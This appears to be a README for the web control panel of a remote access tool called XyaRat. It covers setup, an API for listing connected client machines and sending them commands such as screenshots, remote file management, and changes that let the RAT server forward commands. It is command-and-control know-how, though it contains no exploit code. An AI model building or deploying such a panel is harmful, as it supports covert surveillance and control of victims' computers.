# XyaRat Web Panel

Modern web-based administration panel for XyaRat remote administration tool.

## 🚀 Features

- **Real-time Dashboard** - Live monitoring of connected clients
- **JWT Authentication** - Secure token-based authentication
- **SignalR Real-time Updates** - Instant client status updates
- **Client Management** - View, control, and monitor all clients
- **File Manager** - Remote file operations
- **Command Execution** - Send commands to clients
- **Responsive UI** - Modern React + TypeScript frontend

## 📋 Prerequisites

- .NET 6.0 SDK or later
- Node.js 18+ and npm
- XyaRat Server (existing C# server application)

## 🛠️ Installation

### Backend Setup

1. **Navigate to WebPanel directory:**
   ```bash
   cd WebPanel
   ```

2. **Restore NuGet packages:**
   ```bash
   dotnet restore
   ```

3. **Update configuration:**
   Edit `appsettings.json`:
   ```json
   {
     "Jwt": {
       "Key": "YOUR_SECRET_KEY_MIN_32_CHARACTERS",
       "ExpiryMinutes": 480
     },
     "RatServer": {
       "Host": "127.0.0.1",
       "Port": 5656
     }
   }
   ```

4. **Run migrations (database auto-created):**
   ```bash
   dotnet ef database update
   ```

### Frontend Setup

1. **Navigate to ClientApp:**
   ```bash
   cd ClientApp
   ```

2. **Install dependencies:**
   ```bash
   npm install
   ```

3. **Build frontend:**
   ```bash
   npm run build
   ```

## 🎯 Running the Application

### Development Mode

**Backend (Terminal 1):**
```bash
cd WebPanel
dotnet run
```

**Frontend (Terminal 2):**
```bash
cd WebPanel/ClientApp
npm run dev
```

Access at: `http://localhost:3000`

### Production Mode

1. **Build frontend:**
   ```bash
   cd WebPanel/ClientApp
   npm run build
   ```

2. **Run backend (serves static files):**
   ```bash
   cd WebPanel
   dotnet run --configuration Release
   ```

Access at: `http://localhost:5000`

## 🔑 Default Credentials

```
Username: admin
Password: admin123
```

⚠️ **CHANGE IMMEDIATELY AFTER FIRST LOGIN!**

## 📚 API Documentation

### Authentication

```http
POST /api/auth/login
Content-Type: application/json

{
  "username": "admin",
  "password": "admin123"
}

Response:
{
  "success": true,
  "token": "eyJhbGciOiJIUzI1NiIs...",
  "user": {
    "id": 1,
    "username": "admin",
    "role": "Admin"
  }
}
```

### Get Clients

```http
GET /api/clients
Authorization: Bearer <token>

Response:
[
  {
    "clientId": "client-123",
    "username": "DESKTOP-USER",
    "os": "Windows 10 Pro",
    "ipAddress": "192.168.1.100",
    "country": "US",
    "isConnected": true,
    "ping": 45
  }
]
```

### Send Command

```http
POST /api/clients/{clientId}/command
Authorization: Bearer <token>
Content-Type: application/json

{
  "clientId": "client-123",
  "command": "screenshot",
  "parameters": {}
}
```

## 🔌 SignalR Hub

Connect to real-time updates:

```typescript
import * as signalR from '@microsoft/signalr';

const connection = new signalR.HubConnectionBuilder()
  .withUrl('/hubs/clients', {
    accessTokenFactory: () => token
  })
  .build();

// Listen for events
connection.on('ClientConnected', (client) => {
  console.log('New client:', client);
});

connection.on('ClientDisconnected', (data) => {
  console.log('Client disconnected:', data.clientId);
});

await connection.start();
```

## 🏗️ Architecture

```
WebPanel/
├── Controllers/          # API endpoints
│   ├── AuthController.cs
│   ├── ClientsController.cs
│   ├── DashboardController.cs
│   └── FileManagerController.cs
├── Services/            # Business logic
│   ├── AuthService.cs
│   └── RatBridgeService.cs
├── Hubs/               # SignalR hubs
│   └── ClientHub.cs
├── Data/               # Database context
│   └── WebPanelDbContext.cs
├── Models/             # Data models
│   ├── DatabaseModels.cs
│   └── ApiModels.cs
└── ClientApp/          # React frontend
    ├── src/
    │   ├── pages/      # UI pages
    │   ├── components/ # Reusable components
    │   ├── stores/     # State management
    │   └── App.tsx
    └── package.json
```

## 🔗 Integration with Existing Server

The web panel connects to your existing RAT Server through `RatBridgeService`:

```csharp
// In RatBridgeService.cs
var host = _configuration["RatServer:Host"]; // 127.0.0.1
var port = _configuration["RatServer:Port"];  // 5656

// TCP connection to existing server
_ratServerConnection = new TcpClient();
await _ratServerConnection.ConnectAsync(host, port);
```

### Required Server Modifications

To integrate with existing Server, you need to:

1. **Add WebPanel Communication Handler** in `Server/Handle Packet/`:
   ```csharp
   // Handle messages from WebPanel
   if (packet.ForcePathObject("Source").AsString == "WebPanel")
   {
       // Forward to target client
       ForwardToClient(packet);
   }
   ```

2. **Broadcast Client Events** when clients connect/disconnect:
   ```csharp
   // In Server/Connection/Clients.cs
   public void Connected()
   {
       // Existing code...
       
       // Notify WebPanel
       NotifyWebPanel("ClientConnected", this.ClientInfo);
   }
   ```

3. **Add WebPanel Connection Manager**:
   ```csharp
   // Server/Helper/WebPanelBridge.cs
   public static void NotifyWebPanel(string eventType, object data)
   {
       // Send to WebPanel on port 5000
   }
   ```

## 🔒 Security Notes

1. **Change JWT Secret Key** in production
2. **Use HTTPS** in production (configure in `Program.cs`)
3. **Implement IP whitelist** for admin access
4. **Enable rate limiting** for API endpoints
5. **Change default admin password** immediately

## 📊 Database

SQLite database (`webpanel.db`) stores:
- User accounts
- Client sessions history
- Command execution logs
- File transfer records

## 🎨 Frontend Technology Stack

- **React 18** - UI framework
- **TypeScript** - Type safety
- **Vite** - Build tool
- **Zustand** - State management
- **SignalR Client** - Real-time communication
- **Axios** - HTTP client

## 🚧 Development

### Add New API Endpoint

1. Create controller in `Controllers/`
2. Add service logic in `Services/`
3. Update frontend API calls

### Add New UI Page

1. Create component in `ClientApp/src/pages/`
2. Add route in `App.tsx`
3. Add navigation link in `Layout.tsx`

## 📝 Environment Variables

```bash
# Backend (.NET)
ASPNETCORE_ENVIRONMENT=Development
ASPNETCORE_URLS=http://0.0.0.0:5000

# Frontend (Vite)
VITE_API_URL=http://localhost:5000
```

## 🐛 Troubleshooting

### CORS Errors
Check `Program.cs` CORS policy includes your frontend URL.

### SignalR Connection Failed
Ensure JWT token is valid and WebSocket is allowed.

### Database Locked
Stop all running instances before migrations.

### Frontend Build Errors
```bash
rm -rf node_modules package-lock.json
npm install
npm run build
```

## 📦 Deployment

### Docker (Recommended)

```dockerfile
FROM mcr.microsoft.com/dotnet/aspnet:6.0
WORKDIR /app
COPY . .
EXPOSE 5000
ENTRYPOINT ["dotnet", "WebPanel.dll"]
```

### Linux Service

```bash
# Create systemd service
sudo nano /etc/systemd/system/xyarat-webpanel.service

[Unit]
Description=XyaRat Web Panel

[Service]
WorkingDirectory=/opt/xyarat/WebPanel
ExecStart=/usr/bin/dotnet WebPanel.dll
Restart=always

[Install]
WantedBy=multi-user.target
```

## 📄 License

Same as parent XyaRat project.

## 🤝 Contributing

This is a companion web interface for XyaRat. Contributions welcome!

## ⚠️ Legal Disclaimer

This software is for educational and authorized security testing only. Unauthorized use is illegal.
